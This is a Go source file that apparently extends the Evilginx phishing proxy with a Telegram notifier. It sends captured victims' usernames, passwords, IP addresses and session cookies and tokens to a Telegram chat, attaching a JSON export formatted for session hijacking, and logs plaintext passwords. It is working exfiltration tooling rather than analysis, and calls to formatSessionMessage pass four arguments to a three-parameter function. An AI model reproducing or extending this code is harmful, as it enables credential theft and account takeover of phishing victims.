package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type TelegramBot struct {
	BotToken string
	ChatId   string
}

type TelegramMessage struct {
	ChatId    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

type TelegramResponse struct {
	Ok     bool   `json:"ok"`
	Result string `json:"result"`
}

type TelegramDocument struct {
	ChatId    string `json:"chat_id"`
	Caption   string `json:"caption"`
	ParseMode string `json:"parse_mode"`
}

type SessionExport struct {
	SessionInfo   SessionInfo            `json:"session_info"`
	Credentials   CredentialsInfo        `json:"credentials"`
	AuthTokens    AuthTokensInfo         `json:"auth_tokens"`
	CustomFields  map[string]string      `json:"custom_fields"`
	ExportTime    string                 `json:"export_time"`
}

type SessionInfo struct {
	SessionID    string `json:"session_id"`
	SessionIndex int    `json:"session_index"`
	Phishlet     string `json:"phishlet"`
	IPAddress    string `json:"ip_address"`
	UserAgent    string `json:"user_agent"`
	Timestamp    string `json:"timestamp"`
}

type CredentialsInfo struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type AuthTokensInfo struct {
	CookieTokens map[string]map[string]TokenInfo `json:"cookie_tokens"`
	BodyTokens   map[string]string               `json:"body_tokens"`
	HttpTokens   map[string]string               `json:"http_tokens"`
}

type TokenInfo struct {
	Name      string `json:"name"`
	Value     string `json:"value"`
	Domain    string `json:"domain"`
	Path      string `json:"path"`
	HttpOnly  bool   `json:"http_only"`
	Secure    bool   `json:"secure"`
	SameSite  string `json:"same_site"`
	ExpiresAt string `json:"expires_at"`
}

func NewTelegramBot() *TelegramBot {
	return &TelegramBot{}
}

func (t *TelegramBot) Setup(botToken string, chatId string) {
	t.BotToken = botToken
	t.ChatId = chatId
}

func (t *TelegramBot) SendSessionNotification(session *Session, sessionIndex int, phishletName string, cfgDir string) error {
	// Validate setup
	if t.BotToken == "" || t.ChatId == "" {
		return fmt.Errorf("telegram bot token or chat ID not configured")
	}

	// Enhanced logging for debugging
	log.Debug("telegram: checking session data for notification")
	log.Debug("telegram: session username: '%s'", session.Username)
	log.Debug("telegram: session password: '%s'", session.Password)
	log.Debug("telegram: cookie tokens: %d", len(session.CookieTokens))
	log.Debug("telegram: body tokens: %d", len(session.BodyTokens))
	log.Debug("telegram: http tokens: %d", len(session.HttpTokens))

	// Check if session has meaningful data - made less restrictive
	if !t.hasValidSessionData(session) {
		log.Warning("telegram: skipping notification for session %d - no meaningful data captured", sessionIndex)
		log.Debug("telegram: session details - username: '%s', password: '%s', cookies: %d, body: %d, http: %d", 
			session.Username, session.Password, len(session.CookieTokens), len(session.BodyTokens), len(session.HttpTokens))
		return nil
	}

	log.Info("telegram: sending notification for session %d", sessionIndex)

	// Check if we have auth tokens to send as JSON file
	hasAuthTokens := len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0
	
	if hasAuthTokens {
		// Create JSON export file
		jsonFile, err := t.createSessionExportFile(session, sessionIndex, phishletName, cfgDir)
		if err != nil {
			log.Error("telegram: failed to create JSON export: %v", err)
			// Fall back to text message only
			message := t.formatSessionMessage(session, sessionIndex, phishletName, "")
			return t.sendMessage(message)
		}
		
		// Send document with auth tokens
		caption := t.formatSessionCaption(session, sessionIndex, phishletName)
		err = t.sendDocument(jsonFile, caption)
		if err != nil {
			log.Error("telegram: failed to send document: %v", err)
			// Fall back to text message only
			message := t.formatSessionMessage(session, sessionIndex, phishletName, "")
			return t.sendMessage(message)
		}
		
		// Clean up temporary file
		defer os.Remove(jsonFile)
		
		log.Success("telegram: notification with JSON file sent successfully for session %d", sessionIndex)
		return nil
	} else {
		// No auth tokens, send regular text message
		message := t.formatSessionMessage(session, sessionIndex, phishletName, "")
		err := t.sendMessage(message)
		if err != nil {
			log.Error("telegram: failed to send notification: %v", err)
			return err
		}
		
		log.Success("telegram: notification sent successfully for session %d", sessionIndex)
		return nil
	}
}

func (t *TelegramBot) hasValidSessionData(session *Session) bool {
	// Check if session has meaningful data - made more permissive
	hasCredentials := session.Username != "" || session.Password != ""
	hasTokens := len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0
	hasCustomData := len(session.Custom) > 0
	hasBasicInfo := session.RemoteAddr != "" || session.UserAgent != ""
	
	// Allow notifications for sessions that have any meaningful data
	// This includes credentials, tokens, custom fields, or basic session info
	return hasCredentials || hasTokens || hasCustomData || hasBasicInfo
}

func (t *TelegramBot) formatSessionMessage(session *Session, sessionIndex int, phishletName string) string {
	var message strings.Builder
	
	message.WriteString("🎣 *Evilginx Session Captured*\n\n")
	message.WriteString(fmt.Sprintf("📊 *Session ID:* %d\n", sessionIndex))
	message.WriteString(fmt.Sprintf("🎯 *Phishlet:* %s\n", phishletName))
	message.WriteString(fmt.Sprintf("🌐 *IP Address:* %s\n", session.RemoteAddr))
	message.WriteString(fmt.Sprintf("🖥️ *User Agent:* %s\n", session.UserAgent))
	message.WriteString(fmt.Sprintf("⏰ *Time:* %s\n\n", time.Now().Format("2006-01-02 15:04:05")))

	// Add credentials if available
	if session.Username != "" {
		message.WriteString(fmt.Sprintf("👤 *Username:* %s\n", session.Username))
	}
	if session.Password != "" {
		message.WriteString(fmt.Sprintf("🔑 *Password:* %s\n", session.Password))
	}

	// Add custom fields
	if len(session.Custom) > 0 {
		message.WriteString("\n📝 *Custom Fields:*\n")
		for key, value := range session.Custom {
			message.WriteString(fmt.Sprintf("  • %s: %s\n", key, value))
		}
	}

	// Add token information summary
	tokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
	if tokenCount > 0 {
		message.WriteString(fmt.Sprintf("\n🍪 *Auth Tokens:* %d captured\n", tokenCount))
		message.WriteString("📝 *Note:* Sessions with auth tokens will include downloadable JSON files\n")
	}

	return message.String()
}



func (t *TelegramBot) sendMessage(message string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.BotToken)
	
	log.Debug("telegram: sending message to chat ID: %s", t.ChatId)
	log.Debug("telegram: message length: %d characters", len(message))
	
	telegramMsg := TelegramMessage{
		ChatId:    t.ChatId,
		Text:      message,
		ParseMode: "Markdown",
	}
	
	jsonData, err := json.Marshal(telegramMsg)
	if err != nil {
		log.Error("telegram: failed to marshal message: %v", err)
		return fmt.Errorf("failed to marshal telegram message: %v", err)
	}
	
	log.Debug("telegram: making API request to: %s", url)
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Error("telegram: HTTP request failed: %v", err)
		return fmt.Errorf("failed to send telegram message: %v", err)
	}
	defer resp.Body.Close()
	
	body, _ := ioutil.ReadAll(resp.Body)
	log.Debug("telegram: API response status: %d", resp.StatusCode)
	log.Debug("telegram: API response body: %s", string(body))
	
	if resp.StatusCode != http.StatusOK {
		log.Error("telegram: API error response: %s", string(body))
		return fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
	}
	
	log.Debug("telegram: message sent successfully")
	return nil
}

func (t *TelegramBot) Test() error {
	if t.BotToken == "" || t.ChatId == "" {
		return fmt.Errorf("telegram bot token or chat ID not configured")
	}
	
	testMessage := "🧪 *Evilginx Telegram Test*\n\nTelegram notifications are working correctly!"
	return t.sendMessage(testMessage)
}

func (t *TelegramBot) createSessionExportFile(session *Session, sessionIndex int, phishletName string, cfgDir string) (string, error) {
	// Create export data structure
	exportData := SessionExport{
		SessionInfo: SessionInfo{
			SessionID:    session.Id,
			SessionIndex: sessionIndex,
			Phishlet:     phishletName,
			IPAddress:    session.RemoteAddr,
			UserAgent:    session.UserAgent,
			Timestamp:    time.Now().Format("2006-01-02 15:04:05"),
		},
		Credentials: CredentialsInfo{
			Username: session.Username,
			Password: session.Password,
		},
		AuthTokens: AuthTokensInfo{
			CookieTokens: make(map[string]map[string]TokenInfo),
			BodyTokens:   session.BodyTokens,
			HttpTokens:   session.HttpTokens,
		},
		CustomFields: session.Custom,
		ExportTime:   time.Now().Format("2006-01-02 15:04:05"),
	}
	
	// Convert cookie tokens to exportable format
	for domain, cookies := range session.CookieTokens {
		exportData.AuthTokens.CookieTokens[domain] = make(map[string]TokenInfo)
		for name, cookie := range cookies {
			exportData.AuthTokens.CookieTokens[domain][name] = TokenInfo{
				Name:      name,
				Value:     cookie.Value,
				Domain:    cookie.Domain,
				Path:      cookie.Path,
				HttpOnly:  cookie.HttpOnly,
				Secure:    cookie.Secure,
				SameSite:  cookie.SameSite,
				ExpiresAt: cookie.ExpiresAt.Format("2006-01-02 15:04:05"),
			}
		}
	}
	
	// Convert to JSON
	jsonData, err := json.MarshalIndent(exportData, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal session data: %v", err)
	}
	
	// Create temp file
	tempDir := os.TempDir()
	filename := fmt.Sprintf("evilginx_session_%d_%s_%d.json", sessionIndex, phishletName, time.Now().Unix())
	filePath := filepath.Join(tempDir, filename)
	
	err = ioutil.WriteFile(filePath, jsonData, 0600)
	if err != nil {
		return "", fmt.Errorf("failed to write JSON file: %v", err)
	}
	
	log.Debug("telegram: created JSON export file: %s", filePath)
	return filePath, nil
}

func (t *TelegramBot) formatSessionCaption(session *Session, sessionIndex int, phishletName string) string {
	var caption strings.Builder
	
	caption.WriteString("🎣 *Evilginx Session Captured*\n\n")
	caption.WriteString(fmt.Sprintf("📊 *Session ID:* %d\n", sessionIndex))
	caption.WriteString(fmt.Sprintf("🎯 *Phishlet:* %s\n", phishletName))
	caption.WriteString(fmt.Sprintf("🌐 *IP Address:* %s\n", session.RemoteAddr))
	caption.WriteString(fmt.Sprintf("⏰ *Time:* %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
	
	// Add credentials if available
	if session.Username != "" {
		caption.WriteString(fmt.Sprintf("👤 *Username:* %s\n", session.Username))
	}
	if session.Password != "" {
		caption.WriteString(fmt.Sprintf("🔑 *Password:* %s\n", session.Password))
	}
	
	// Add token count summary
	tokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
	if tokenCount > 0 {
		caption.WriteString(fmt.Sprintf("\n🍪 *Auth Tokens:* %d captured\n", tokenCount))
		caption.WriteString("📁 *Detailed tokens available in attached JSON file*")
	}
	
	return caption.String()
}

func (t *TelegramBot) sendDocument(filePath string, caption string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.BotToken)
	
	// Open file
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()
	
	// Create multipart form
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)
	
	// Add chat_id field
	writer.WriteField("chat_id", t.ChatId)
	
	// Add caption field
	writer.WriteField("caption", caption)
	writer.WriteField("parse_mode", "Markdown")
	
	// Add document field
	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}
	
	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}
	
	writer.Close()
	
	log.Debug("telegram: sending document to chat ID: %s", t.ChatId)
	log.Debug("telegram: document path: %s", filePath)
	
	// Send request
	req, err := http.NewRequest("POST", url, &requestBody)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	
	req.Header.Set("Content-Type", writer.FormDataContentType())
	
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Error("telegram: HTTP request failed: %v", err)
		return fmt.Errorf("failed to send document: %v", err)
	}
	defer resp.Body.Close()
	
	body, _ := ioutil.ReadAll(resp.Body)
	log.Debug("telegram: API response status: %d", resp.StatusCode)
	log.Debug("telegram: API response body: %s", string(body))
	
	if resp.StatusCode != http.StatusOK {
		log.Error("telegram: API error response: %s", string(body))
		return fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
	}
	
	log.Debug("telegram: document sent successfully")
	return nil
}